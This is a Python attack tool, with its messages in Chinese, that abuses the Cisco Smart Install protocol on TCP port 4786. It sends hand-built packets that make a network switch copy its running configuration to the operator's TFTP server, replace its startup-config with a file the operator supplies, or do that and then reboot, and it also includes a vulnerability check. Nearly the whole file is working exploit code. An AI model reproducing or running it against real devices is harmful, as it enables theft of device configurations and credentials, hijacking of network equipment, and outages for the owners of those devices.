# -*- coding:utf-8 -*-
import struct
import socket
import sys

def get_local_ip_addr():
    myname = socket.getfqdn(socket.gethostname())
    myaddr = socket.gethostbyname(myname)
    return myaddr

def conn_with_client(data, ip, mode=0):  # Set connection with remote client

    #args = get_argm_from_user()
    resp = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00'

    try:
        conn_with_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn_with_host.settimeout(5)
        conn_with_host.connect((ip, 4786))
        my_ip = get_local_ip_addr()

        if data:
            conn_with_host.send(data)

            if mode == 0:
                conn_with_host.close()
                print('数据已经成功发送到 %s: ' % ip)

            elif mode == 1:

                while True:

                    data = conn_with_host.recv(512)

                    if (len(data) < 1):
                        print('Smart Install服务已经激活在 {0}!'.format(ip))
                        print('{0} 不受漏洞影响.'.format(ip))
                        break
                    elif (len(data) == 24):
                        if (data == resp):
                            print('Smart Install服务已经激活在 {0}!'.format(ip))
                            print('漏洞可以利用!'.format(ip))
                            break
                        else:
                            print(
                            '收到异常回应, Smart Install服务也许已经激活在 {0}'.format(
                                ip))
                            print('不能确定 {0} 是否存在漏洞.'.format(ip))
                            break
                    else:
                        print(
                        '收到异常回应, Smart Install服务也许已经激活在 {0}'.format(
                            ip))
                        print('不能确定 {0} 是否存在漏洞.'.format(ip))
                        break

                conn_with_host.close()

        return my_ip

    except KeyboardInterrupt:
        print('你输入了Ctrl + C, 退出.')
        sys.exit()

    except socket.gaierror:
        print('主机无法解析, 退出.')
        sys.exit()

    except socket.error:
        print("无法连接到 %s, 退出." % ip)
        sys.exit()

def get_config(ip):
    print('注意此次操将获取配置到TFTP服务器，配置文件将会被保存为 "deviceip.conf"！')
    transmit_data = b'\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x04\x08\x00\x01\x00\x14\x00\x00\x00\x01\x00\x00\x00\x00\xfc\x99G7\x86`\x00\x00\x00\x03\x03\xf4'

    my_ip = get_local_ip_addr()

    cmd1 = 'copy system:running-config flash:/config.text'
    cmd2 = 'copy flash:/config.text tftp://' + my_ip + '/' + ip + '.conf'
    cmd3 = ''

    transmit_data = transmit_data + bytes(cmd1,'utf8') + b'\x00' * (336 - len(cmd1))
    transmit_data = transmit_data + bytes(cmd2,'utf8') + b'\x00' * (336 - len(cmd2))
    transmit_data = transmit_data + bytes(cmd3,'utf8') + b'\x00' * (336 - len(cmd3))

    conn_with_client(transmit_data, ip)

def change_startup(ip,new_startup_config):
    print('注意此次操作仅仅修改配置！')
    transmit_data = b'\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x04\x08\x00\x01\x00\x14\x00\x00\x00\x01\x00\x00\x00\x00\xfc\x99G7\x86`\x00\x00\x00\x03\x03\xf4'

    my_ip = get_local_ip_addr()

    cmd1 = 'copy tftp://'+ my_ip + '/' + new_startup_config + ' nvram:startup-config'
    cmd2 = ''
    cmd3 = ''

    transmit_data = transmit_data + bytes(cmd1,'utf8') + b'\x00' * (336 - len(cmd1))
    transmit_data = transmit_data + bytes(cmd2,'utf8') + b'\x00' * (336 - len(cmd2))
    transmit_data = transmit_data + bytes(cmd3,'utf8') + b'\x00' * (336 - len(cmd3))

    conn_with_client(transmit_data, ip)

def change_startup_reload(ip,new_startup_config):
    print('注意此次操作将修改配置，并且在一分钟后重启！')
    my_ip = get_local_ip_addr()
    tftp_Conf = 'tftp://' + my_ip + '/' + new_startup_config

    Dump_section_1 = b'\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x01(\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
    Dump_section_2 = struct.pack('b',0) * (264 - len(tftp_Conf))
    transmit_data = Dump_section_1 + struct.pack('b',0) * 4 + struct.pack('b',1) + struct.pack('b',0) * 132 + bytes(tftp_Conf,'utf8') + Dump_section_2
    conn_with_client(transmit_data, ip)


def test_device(device_ip): # Testing for smart install
    transmit_data = b'\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x08'

    # print('[DEBUG]: Packet for sent: ' + sTcp)
    print('发送TCP数据包到 %s ' % device_ip)
    # print('[DEBUG]: Decoded packet to sent: ' + sTcp.decode('hex'))
    conn_with_client(transmit_data, device_ip, mode=1)

if __name__ == '__main__':
    from optparse import OptionParser

    usage = "使用方法: python smart_install.py -t -i ip"
    version = "版本 1.0"
    parser = OptionParser(usage=usage, version=version)
    parser.add_option("-t", "--test", action="store_true", help="测试设备是否有smart install漏洞")
    parser.add_option("-c", "--change", dest="change", help="仅仅修改startup config")
    parser.add_option("-g", "--getconfig", action="store_true", help="仅仅获取配置")
    parser.add_option("-r", "--reload", dest="reload", help="修改startup config，并且重启")
    parser.add_option("-i", "--ipaddr", dest="ip", help="指定设备的IP地址")
    (options, args) = parser.parse_args()

    #print(options)
    #print(args)

    if options.ip == None:
        print('请输入IP地址！！！')
        sys.exit()

    elif options.test == True and options.change == None and options.getconfig == None and options.reload == None:
        test_device(options.ip)

    elif options.test == None and options.change != None and options.getconfig == None and options.reload == None:
        change_startup(options.ip, options.change)

    elif options.test == None and options.change == None and options.getconfig == True and options.reload == None:
        get_config(options.ip)

    elif options.test == None and options.change == None and options.getconfig == None and options.reload != None:
        change_startup_reload(options.ip, options.reload)

    else:
        print('格式错误！！！')



